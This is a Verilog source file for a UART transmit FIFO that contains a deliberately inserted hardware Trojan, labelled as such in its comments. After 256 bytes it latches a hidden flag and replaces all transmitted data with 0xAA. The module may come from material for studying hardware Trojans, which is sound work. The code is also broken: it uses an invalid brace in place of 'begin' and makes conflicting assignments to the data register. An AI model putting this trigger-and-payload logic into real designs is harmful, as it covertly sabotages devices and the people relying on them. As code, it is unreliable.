 module uart_tx_fifo (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // FIFO memory and pointers
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // Trojan trigger and payload
    reg [15:0] byte_count = 16'd0; // Counter for the number of bytes sent
    reg trojan_active = 1'b0; // Flag indicating whether the Trojan is active

    // UART TX instance
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Conditions for Trojan activation and effect
    always @ (posedge clk) begin
        if (rx_we) begin
            // Write incoming data to the FIFO
            if (cnt < 5'd31) begin
                w_addr <= w_addr + 5'd1;
                mem[w_addr] <= rx_data;
                cnt <= cnt + 5'd1;
            end
        end

        // Read from FIFO and prepare data for UART transmission
        if (~uart_busy && cnt > 5'd0 && ~we) begin
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            data <= mem[r_addr];
            we <= 1'b1;
            byte_count <= byte_count + 1'b1; // Increment byte counter

            // Check if the Trojan should be activated
            if (byte_count == 16'd256) begin // Activation condition, e.g., after 256 bytes
                trojan_active <= 1'b1;
            end
        end else {
            we <= 1'b0;
        end

        // If the Trojan is active, modify the data
        if (trojan_active) begin
            data <= 8'hAA; // Replace data with the Trojan's payload
        end
    end

endmodule
